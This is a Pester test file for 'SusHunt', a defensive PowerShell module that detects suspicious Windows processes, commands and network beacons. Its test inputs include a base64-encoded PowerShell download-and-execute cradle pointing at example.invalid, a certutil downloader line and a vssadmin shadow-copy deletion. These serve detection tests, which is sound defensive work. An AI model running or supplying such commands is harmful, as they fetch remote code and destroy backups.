# Unit tests for the pure logic (no machine state needed). Written for the Pester 3.4 that ships
# with Windows (also runs on Pester 4). Run from the repo root:  Invoke-Pester .\tests

$root = Split-Path -Parent (Split-Path -Parent $MyInvocation.MyCommand.Path)
Import-Module (Join-Path $root 'SusHunt.psm1') -Force

InModuleScope SusHunt {
    Describe 'Test-IpInCidr' {
        It 'matches the last address inside an IPv4 /12' { Test-IpInCidr '172.31.255.254' '172.16.0.0/12' | Should Be $true }
        It 'rejects the first address after it' { Test-IpInCidr '172.32.0.1' '172.16.0.0/12' | Should Be $false }
        It 'handles a prefix that splits a byte (/10)' { Test-IpInCidr '100.127.0.1' '100.64.0.0/10' | Should Be $true }
        It 'handles IPv6' { Test-IpInCidr 'fe80::1234' 'fe80::/10' | Should Be $true }
        It 'never matches across address families' { Test-IpInCidr '10.0.0.1' '::/0' | Should Be $false }
    }

    Describe 'Get-IpScope' {
        It 'knows RFC 1918' { Get-IpScope '192.168.1.10' | Should Be 'Private' }
        It 'knows CGNAT (Tailscale range)' { Get-IpScope '100.101.102.103' | Should Be 'CGNAT' }
        It 'unwraps IPv4-mapped IPv6' { Get-IpScope '::ffff:10.1.2.3' | Should Be 'Private' }
        It 'calls the any-address Unspecified' { Get-IpScope '0.0.0.0' | Should Be 'Unspecified' }
        It 'defaults to Public' { Get-IpScope '1.1.1.1' | Should Be 'Public' }
        It 'rejects junk' { Get-IpScope 'not-an-ip' | Should Be 'Invalid' }
    }

    Describe 'network byte order' {
        It 'swaps the two port bytes (443 = 0x01BB -> 0xBB01)' { ConvertTo-NetworkOrderPort 443 | Should Be 0xBB01 }
        It 'lays out 127.0.0.1 as 7F 00 00 01 in memory' { ConvertTo-NetworkOrderAddress '127.0.0.1' | Should Be 0x0100007F }
    }

    Describe 'Get-EditDistance' {
        It 'counts a classic example' { Get-EditDistance 'kitten' 'sitting' | Should Be 3 }
        It 'treats a swap of neighbours as one edit' { Get-EditDistance 'scvhost' 'svchost' | Should Be 1 }
        It 'is zero for equal strings, ignoring case' { Get-EditDistance 'LSASS' 'lsass' | Should Be 0 }
    }

    Describe 'Get-LookalikeName' {
        It 'catches a digit swap' { Get-LookalikeName 'svch0st.exe' | Should Be 'svchost.exe' }
        It 'catches a letter swap' { Get-LookalikeName 'lsasss.exe' | Should Be 'lsass.exe' }
        It 'leaves the real name alone' { Get-LookalikeName 'svchost.exe' | Should BeNullOrEmpty }
        It 'leaves known real near-misses alone' { Get-LookalikeName 'taskhost.exe' | Should BeNullOrEmpty }
        It 'leaves unrelated names alone' { Get-LookalikeName 'notepad.exe' | Should BeNullOrEmpty }
    }

    Describe 'Get-CommandLineSignals' {
        $payload = 'IEX (New-Object Net.WebClient).DownloadString("http://example.invalid/a")'
        $enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($payload))

        It 'flags an encoded command and looks inside it' {
            $rules = @(Get-CommandLineSignals "powershell.exe -nop -w hidden -enc $enc" | ForEach-Object { $_.Rule })
            $rules -contains 'EncodedPowerShell' | Should Be $true
            $rules -contains 'DownloadAndRun(decoded)' | Should Be $true
            $rules -contains 'HiddenWindow' | Should Be $true
        }
        It 'shows the decoded text as evidence' {
            $s = Get-CommandLineSignals "powershell -e $enc" | Where-Object { $_.Rule -eq 'EncodedPowerShell' }
            $s.Evidence | Should Match 'DownloadString'
        }
        It 'does not mistake -ExecutionPolicy for -EncodedCommand' {
            $rules = @(Get-CommandLineSignals 'powershell.exe -ExecutionPolicy Bypass -File C:\x.ps1' | ForEach-Object { $_.Rule })
            $rules -contains 'EncodedPowerShell' | Should Be $false
            $rules -contains 'PolicyBypass' | Should Be $true
        }
        It 'flags certutil used as a downloader' {
            (Get-CommandLineSignals 'certutil.exe -urlcache -split -f http://example.invalid/a.exe a.exe').Rule | Should Be 'CertutilDownload'
        }
        It 'flags shadow copy deletion' {
            (Get-CommandLineSignals 'vssadmin.exe delete shadows /all /quiet').Rule | Should Be 'InhibitRecovery'
        }
        It 'stays quiet on an ordinary command' {
            Get-CommandLineSignals '"C:\Windows\System32\notepad.exe" C:\notes.txt' | Should BeNullOrEmpty
        }
    }

    Describe 'Get-ExecutableFromCommand' {
        $cmdExe = Join-Path $env:windir 'System32\cmd.exe'
        It 'takes a quoted path as-is' { Get-ExecutableFromCommand "`"$cmdExe`" /c echo hi" | Should Be $cmdExe }
        It 'walks an unquoted path the way CreateProcess does' { Get-ExecutableFromCommand "$cmdExe /c echo hi" | Should Be $cmdExe }
        It 'expands environment variables' { Get-ExecutableFromCommand '%windir%\System32\cmd.exe /c' | Should Be $cmdExe }
        It 'resolves a bare name through PATH' { Get-ExecutableFromCommand 'cmd.exe /c echo hi' | Should Be $cmdExe }
        It 'resolves a quoted bare name through PATH' { Get-ExecutableFromCommand '"cmd.exe" /c echo hi' | Should Be $cmdExe }
    }

    Describe 'Test-UnquotedServicePath' {
        It 'flags spaces without quotes' { Test-UnquotedServicePath 'C:\Program Files\Vendor App\svc.exe -k' | Should Be $true }
        It 'accepts a quoted path' { Test-UnquotedServicePath '"C:\Program Files\Vendor App\svc.exe" -k' | Should Be $false }
        It 'ignores a path without spaces' { Test-UnquotedServicePath 'C:\Tools\svc.exe' | Should Be $false }
    }

    Describe 'Get-PathRisk' {
        It 'rates Temp as high risk' { Get-PathRisk 'C:\Users\someone\AppData\Local\Temp\x.exe' | Should Be 'HighRisk' }
        It 'rates Downloads as high risk' { Get-PathRisk 'C:\Users\someone\Downloads\setup.exe' | Should Be 'HighRisk' }
        It 'rates Roaming as user-writable' { Get-PathRisk 'C:\Users\someone\AppData\Roaming\App\app.exe' | Should Be 'UserWritable' }
        It 'knows Program Files' { Get-PathRisk 'C:\Program Files (x86)\App\app.exe' | Should Be 'ProgramFiles' }
        It 'knows the Windows folder' { Get-PathRisk (Join-Path $env:windir 'System32\svchost.exe') | Should Be 'Windows' }
        It 'normalizes \??\ prefixes' { Get-PathRisk ('\??\' + (Join-Path $env:windir 'System32\conhost.exe')) | Should Be 'Windows' }
    }

    Describe 'Test-Beacon' {
        It 'spots a 30 s timer with jitter' {
            $b = Test-Beacon @(0, 30, 61, 90, 121, 150, 180)
            $b | Should Not BeNullOrEmpty
            $b.MeanSeconds | Should Be 30
        }
        It 'ignores bursty traffic' { Test-Beacon @(0, 2, 5, 60, 61, 200, 204) | Should BeNullOrEmpty }
        It 'needs enough samples' { Test-Beacon @(0, 30, 60) | Should BeNullOrEmpty }
    }

    Describe 'New-Finding' {
        It 'sums and caps the score at 100' {
            $f = New-Finding -Category 'Test' -Name 'x' -Signals @((New-Signal 'A' 70 '' '' ''), (New-Signal 'B' 60 '' '' ''))
            $f.Score | Should Be 100
            $f.Severity | Should Be 'High'
            $f.Summary | Should Be 'A, B'
        }
        It 'scores zero with no signals' { (New-Finding -Category 'Test' -Name 'x' -Signals @()).Score | Should Be 0 }
    }

    Describe 'Get-PathRisk: user-writable folders inside Windows' {
        It 'does not trust C:\Windows\Tasks' { Get-PathRisk (Join-Path $env:windir 'Tasks\x.exe') | Should Be 'HighRisk' }
        It 'does not trust the spool color folder' { Get-PathRisk (Join-Path $env:windir 'System32\spool\drivers\color\x.exe') | Should Be 'HighRisk' }
        It 'still trusts System32 itself' { Get-PathRisk (Join-Path $env:windir 'System32\notepad.exe') | Should Be 'Windows' }
    }

    Describe 'signature cache' {
        It 'does not cache a missing file' {
            $p = Join-Path $env:TEMP ("sushunt-missing-{0}.exe" -f [guid]::NewGuid())
            (Get-FileSignature $p).Exists | Should Be $false
            $script:SigCache.ContainsKey($p) | Should Be $false
        }
        It 'caches a real file with a stamp' {
            $p = Join-Path $env:windir 'System32\notepad.exe'
            (Get-FileSignature $p).Status | Should Be 'Valid'
            $script:SigCache[$p].Stamp | Should Not BeNullOrEmpty
        }
    }

    Describe 'Resolve-BareCommand' {
        $sys32 = Join-Path $env:windir 'System32'
        It 'finds a System32 program first' { Resolve-BareCommand 'cmd.exe' -PathScope Machine | Should Be (Join-Path $sys32 'cmd.exe') }
        It 'adds .exe when the name has no extension' { Resolve-BareCommand 'cmd' -PathScope Machine | Should Be (Join-Path $sys32 'cmd.exe') }
        It 'checks the working directory before PATH' {
            $dir = Join-Path $env:TEMP ("sushunt-wd-{0}" -f [guid]::NewGuid())
            $null = New-Item -ItemType Directory -Path $dir
            try {
                $null = New-Item -ItemType File -Path (Join-Path $dir 'sushunt-test-tool.exe')
                Resolve-BareCommand 'sushunt-test-tool.exe' -WorkingDirectory $dir -PathScope Machine | Should Be (Join-Path $dir 'sushunt-test-tool.exe')
            } finally { Remove-Item -LiteralPath $dir -Recurse -Force }
        }
        It 'returns nothing for an unknown name' { Resolve-BareCommand 'no-such-program-sushunt' -PathScope Machine | Should BeNullOrEmpty }
    }

    Describe 'Get-SearchOrderSignal' {
        It 'flags a bare name that resolved into a user folder' {
            (Get-SearchOrderSignal 'tool.exe -x' 'C:\Users\someone\AppData\Local\Temp\tool.exe').Rule | Should Be 'BareNameWritableDir'
        }
        It 'ignores a full path' { Get-SearchOrderSignal 'C:\Users\someone\tool.exe' 'C:\Users\someone\tool.exe' | Should BeNullOrEmpty }
        It 'ignores a bare name that resolved into System32' {
            Get-SearchOrderSignal 'cmd.exe /c' (Join-Path $env:windir 'System32\cmd.exe') | Should BeNullOrEmpty
        }
    }

    Describe 'Test-SameProcess' {
        $me = Get-CimInstance Win32_Process -Filter "ProcessId=$PID"
        It 'accepts the same process' {
            Test-SameProcess ([pscustomobject]@{ PID = $PID; ProcessStart = $me.CreationDate; Path = (ConvertTo-NormalPath $me.ExecutablePath) }) | Should Be $true
        }
        It 'rejects a different start time (PID reuse)' {
            Test-SameProcess ([pscustomobject]@{ PID = $PID; ProcessStart = $me.CreationDate.AddMinutes(-5); Path = $null }) | Should Be $false
        }
    }

    Describe 'HTML report' {
        It 'encodes values so markup in a process name stays text' {
            $f = New-Finding -Category 'Process' -Name '<script>alert(1)</script>' -Signals @(New-Signal 'R' 20 'T1036.005' 'why & how' '<b>')
            $html = ConvertTo-SusFindingHtml @($f)
            $html | Should Match '&lt;script&gt;alert\(1\)&lt;/script&gt;'
            $html | Should Not Match '<script>alert'
            $html | Should Match 'attack.mitre.org/techniques/T1036/005/'
        }
        It 'renders an empty change list' { ConvertTo-SusChangeHtml @() | Should Match 'No changes since the baseline' }
    }

    Describe 'Sysmon event parsing' {
        function New-SysmonXml($id, $data) {
            $fields = ($data.GetEnumerator() | ForEach-Object { "<Data Name='$($_.Key)'>$($_.Value)</Data>" }) -join ''
            "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><EventID>$id</EventID><TimeCreated SystemTime='2026-01-01T12:00:00.000Z'/></System><EventData>$fields</EventData></Event>"
        }
        It 'reads EventID, time and data fields' {
            $e = ConvertFrom-SysmonEventXml (New-SysmonXml 1 @{ Image = 'C:\Windows\System32\notepad.exe'; ProcessId = '42' })
            $e.Id | Should Be 1
            $e.Image | Should Be 'C:\Windows\System32\notepad.exe'
            $e.Time.ToUniversalTime().Year | Should Be 2026
        }
        It 'scores a document app starting a shell' {
            $e = ConvertFrom-SysmonEventXml (New-SysmonXml 1 @{
                Image = (Join-Path $env:windir 'System32\WindowsPowerShell\v1.0\powershell.exe'); ProcessId = '200'; ParentProcessId = '100'
                ParentImage = 'C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE'; CommandLine = 'powershell.exe -NoProfile' })
            $r = Get-SysmonEventSignals $e @{} @{}
            @($r.Signals | ForEach-Object { $_.Rule }) -contains 'DocumentSpawnedShell' | Should Be $true
        }
        It 'ignores private-network connections' {
            $e = ConvertFrom-SysmonEventXml (New-SysmonXml 3 @{ Image = 'C:\x\app.exe'; DestinationIp = '192.168.1.10'; DestinationPort = '443' })
            Get-SysmonEventSignals $e @{} @{} | Should BeNullOrEmpty
        }
        It 'spots a DNS lookup repeating on a timer' {
            $times = @{}; $alerted = @{}; $result = $null
            foreach ($s in 0, 60, 121, 180, 241, 300, 360) {
                $t = ([datetime]'2026-01-01T12:00:00Z').AddSeconds($s).ToString('yyyy-MM-ddTHH:mm:ss.fffZ')
                $xml = (New-SysmonXml 22 @{ Image = 'C:\x\app.exe'; QueryName = 'updates.example.invalid' }) -replace '2026-01-01T12:00:00.000Z', $t
                $r = Get-SysmonEventSignals (ConvertFrom-SysmonEventXml $xml) $times $alerted
                if ($r.Type -eq 'BEACON') { $result = $r }
            }
            $result | Should Not BeNullOrEmpty
        }
    }
}
